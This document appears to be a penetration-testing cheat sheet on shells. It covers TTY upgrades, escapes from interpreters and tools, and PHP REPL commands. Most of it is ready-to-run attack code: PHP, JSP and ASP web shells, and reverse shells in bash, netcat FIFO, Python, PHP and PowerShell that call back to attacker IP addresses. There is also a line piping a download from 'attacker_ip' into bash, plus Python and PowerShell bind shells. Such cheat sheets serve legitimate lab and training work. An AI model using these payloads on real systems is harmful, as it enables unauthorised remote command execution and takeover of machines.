---
description: and Shells
icon: book-skull
---

# Shells/TTYs

<details>

<summary><mark style="color:orange;"><strong><code>TTY</code></strong></mark> <mark style="color:purple;"><strong>-</strong></mark> <mark style="color:purple;"><strong><code>Teletypewriters</code></strong></mark> </summary>

{% hint style="info" %}
<mark style="color:purple;">**Full**</mark> <mark style="color:orange;">**`TTY`**</mark>

#### <mark style="color:orange;">`BASH`</mark>

1. <mark style="color:red;">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</mark>
2. &#x20;<kbd><mark style="color:red;">**CTRL+Z**<mark style="color:red;"></kbd>
3. <mark style="color:red;">**`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`**</mark>

#### <mark style="color:orange;">**`ZSH`**</mark>

1. <mark style="color:red;">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</mark>
2. <kbd><mark style="color:red;">**CTRL+Z**<mark style="color:red;"></kbd>
3. <mark style="color:red;">**`stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`**</mark>
{% endhint %}

{% hint style="info" %}
### <mark style="color:red;">`Clear Terminal`</mark>

<mark style="color:purple;">Set the environmental variable from the terminal to</mark> <mark style="color:orange;">**`xterm`**</mark><mark style="color:purple;">:</mark>

{% code title="Change the env to xterm" %}
```editorconfig
export TERM=xterm
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
### <mark style="color:red;">`Terminal Size`</mark>

<mark style="color:purple;">Sometimes you may need to adjust your terminal size to the needs of the situation:</mark>

{% code title="Check your terminal size" %}
```
stty size
```
{% endcode %}

{% code title="Now, change it in the target" overflow="wrap" %}
```sh
stty rows <NUMBER> columns <NUMBER>
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
### <mark style="color:red;">`Use arrow-keys`</mark>

#### <mark style="color:orange;">`BASH`</mark>

{% code title="Just use it" %}
```sh
bash
```
{% endcode %}

{% code title="Turn history on" %}
```sh
set -o history
```
{% endcode %}

* <mark style="color:purple;">In the</mark> <mark style="color:orange;">**`.bashrc`**</mark> <mark style="color:purple;">file, make sure</mark> <mark style="color:orange;">**`HISTSIZE`**</mark> <mark style="color:purple;">is not set to</mark> <mark style="color:orange;">**`0`**</mark><mark style="color:purple;">:</mark>

```editorconfig
HISTSIZE=1000
HISTFILESIZE=1000
```
{% endhint %}

{% hint style="info" %}
<mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">**enables line editing and history:**</mark>

{% code title="Listener example" overflow="wrap" %}
```sh
rlwrap nc -lvnp <port>
```
{% endcode %}

{% code title="Connection example" overflow="wrap" %}
```sh
rlwrap nc 10.10.10.131 6200
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:red;"><strong><code>Spawning Shells</code></strong></mark></summary>

{% hint style="info" %}
<mark style="color:purple;">The</mark> <mark style="color:orange;">**`pty`**</mark> <mark style="color:purple;">module in</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">allows you to spawn a new process in a pseudo-terminal, effectively creating an interactive shell:</mark>

```sh
python3 -c 'import pty; pty.spawn("/bin/sh")' 
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">The</mark> <mark style="color:orange;">**`script`**</mark> <mark style="color:purple;">command starts a shell session and records the session to a file.</mark> <mark style="color:orange;">**`/dev/null`**</mark> <mark style="color:purple;">is specified as the file where the session is "recorded", but since it's</mark> <mark style="color:orange;">**`/dev/null`**</mark><mark style="color:purple;">, no logging actually happens:</mark>

```sh
script -qc /bin/bash /dev/null
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Also is possible to use</mark> <mark style="color:orange;">**`echo`**</mark> <mark style="color:purple;">to pass</mark>  <mark style="color:green;">**`Python`**</mark> <mark style="color:orange;">**`os.system('/bin/bash')`**</mark> <mark style="color:purple;">to the Python interpreter:</mark>

```sh
echo os.system('/bin/bash') 
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Spawn an interactive shell directly from the terminal:</mark>

```bash
/bin/sh -i
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">The command</mark> <mark style="color:orange;">**`exec "/bin/sh"`**</mark> <mark style="color:purple;">replaces the running</mark> <mark style="color:orange;">**`Perl`**</mark> <mark style="color:purple;">process with a new</mark> <mark style="color:orange;">**`/bin/sh`**</mark> <mark style="color:purple;">shell:</mark>

```sh
perl -e 'exec "/bin/sh";'
```

{% code title="Spawn the shell directly" %}
```bash
perl: exec "/bin/sh";
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Ruby`**</mark><mark style="color:purple;">'s</mark> <mark style="color:orange;">**`exec`**</mark> <mark style="color:purple;">function, like in Perl, replaces the current process with a new process—in this case,</mark> <mark style="color:orange;">**`/bin/sh`**</mark><mark style="color:purple;">:</mark>

```sh
ruby: exec "/bin/sh"
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Runs a shell command from</mark> <mark style="color:orange;">**`Lua`**</mark><mark style="color:purple;">, but unlike in</mark> <mark style="color:orange;">**`Perl`**</mark> <mark style="color:purple;">or</mark> <mark style="color:red;">**`Ruby`**</mark><mark style="color:purple;">, this does not replace the current process. It runs</mark> <mark style="color:orange;">**`/bin/sh`**</mark> <mark style="color:purple;">as a child process:</mark>

```bash
lua: os.execute('/bin/sh')
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Replaces the current</mark> <mark style="color:red;">**`Ruby`**</mark> <mark style="color:purple;">interpreter (IRB) with the shell:</mark>

```bash
exec "/bin/sh";
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Used to execute an external shell command:</mark>

```sh
:!bash
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Changes the default shell used by vim's</mark> <mark style="color:orange;">**`:!`**</mark> <mark style="color:purple;">command:</mark>

```bash
:set shell=/bin/bash:shell
```
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">Spawn a shell from within the</mark> <mark style="color:orange;">**`nmap`**</mark> <mark style="color:purple;">interface, enabling the execution of additional shell commands while scanning:</mark>

```sh
!sh
```
{% endhint %}



</details>

<details>

<summary><mark style="color:orange;"><strong><code>PSY</code></strong></mark></summary>

<mark style="color:orange;">**`PSY`**</mark> <mark style="color:purple;">Shell is an interactive</mark> <mark style="color:orange;">**`PHP REPL (Read-Eval-Print Loop)`**</mark> <mark style="color:purple;">used normally for debugging.</mark>

{% code title="Print the working directory" %}
```php
getcwd()
```
{% endcode %}

{% code title="Print the current user" %}
```php
get_current_user()
```
{% endcode %}

{% code title="Print system info" %}
```php
phpinfo()
```
{% endcode %}

{% code title="Print contents from directory" %}
```php
scandir("/home")
```
{% endcode %}

{% code title="Print content from file" overflow="wrap" %}
```php
file_get_contents("/etc/os-release")
```
{% endcode %}

</details>

<details>

<summary><mark style="color:red;"><strong><code>Web Shells</code></strong></mark></summary>

{% hint style="info" %}
<mark style="color:red;">**`Save the shells`**</mark>

{% code overflow="wrap" %}
```sh
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```
{% endcode %}
{% endhint %}

{% code title="PHP Shell" overflow="wrap" %}
```php
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

{% code title="JSP - Java Server Pages" overflow="wrap" %}
```sh
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
{% endcode %}

{% code title="ASP - Active Server Pages" %}
```aspnet
<% eval request("cmd") %>
```
{% endcode %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>BASH</code></strong></mark> <mark style="color:red;"><strong><code>Reverse Shells</code></strong></mark></summary>

{% code title="Standard" overflow="wrap" %}
```sh
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```
{% endcode %}

{% code title="URL" overflow="wrap" %}
```url
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/9001+0>%261'
```
{% endcode %}

{% hint style="info" %}
<mark style="color:orange;">**`FIFO`**</mark>

{% code overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
{% endcode %}

{% code title="URL Encoded" overflow="wrap" %}
```url
rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20/bin/sh%20-i%202%3E%261%20%7C%20nc%2010.10.16.10%204444%20%3E%20/tmp/f
```
{% endcode %}
{% endhint %}

{% code title="Run it in the background" %}
```sh
nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" &
```
{% endcode %}

</details>

<details>

<summary><mark style="color:green;"><strong><code>Python</code></strong></mark> <mark style="color:red;"><strong><code>Reverse Shells</code></strong></mark></summary>

{% hint style="info" %}
<mark style="color:orange;">**`PTY`**</mark>

{% code title="One-liner IPv4" overflow="wrap" %}
```sh
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
{% endcode %}

{% code title="Save in a file IPv4" overflow="wrap" %}
```sh
echo 'import pty
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.6", 4444))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/bash")
s.close()' > shell.py
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:orange;">**`subprocess`**</mark>

{% code title="One-liner IPv4 " overflow="wrap" %}
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

{% code title="Save it in a file IPv4" overflow="wrap" %}
```sh
echo 'import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.157", 1235))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
s.close()' > shell.py
```
{% endcode %}
{% endhint %}

{% code title="UDP Reverse shell" overflow="wrap" %}
```python
import os
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.16.10 4444 >/tmp/f &").read()
```
{% endcode %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>PHP</code></strong></mark> <mark style="color:red;"><strong><code>Reverse shell</code></strong></mark></summary>

{% code title="Direct reverse shell" overflow="wrap" %}
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
```
{% endcode %}

{% code title="Remote reverse shell" overflow="wrap" %}
```php
<?php system("curl http://attacker_ip/reverseshell | bash"); ?>
```
{% endcode %}

{% code title="FIFO " overflow="wrap" %}
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <Port> >/tmp/f"); ?>
```
{% endcode %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>Powershell</code></strong></mark> <mark style="color:red;"><strong><code>Reverse shell</code></strong></mark></summary>

{% code title="" overflow="wrap" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}

</details>

<details>

<summary><mark style="color:red;"><strong><code>Bind Shells</code></strong></mark></summary>

{% hint style="info" %}
* <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>

{% code title="Linux" overflow="wrap" lineNumbers="true" %}
```sh
ss -tuln
netstat -tuln
lsof -i -n
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```sh
netstat -ano | findstr "LISTEN"
Get-Process | Where-Object {$_.Id -eq (Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}).OwningProcess}
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Check the firewall rules in Windows:`**</mark>

```powershell
netsh advfirewall firewall show rule name=all
```
{% endhint %}

{% code title="Python Shell" overflow="wrap" %}
```sh
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
{% endcode %}

{% code title="Powershell" overflow="wrap" %}
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
{% endcode %}

</details>
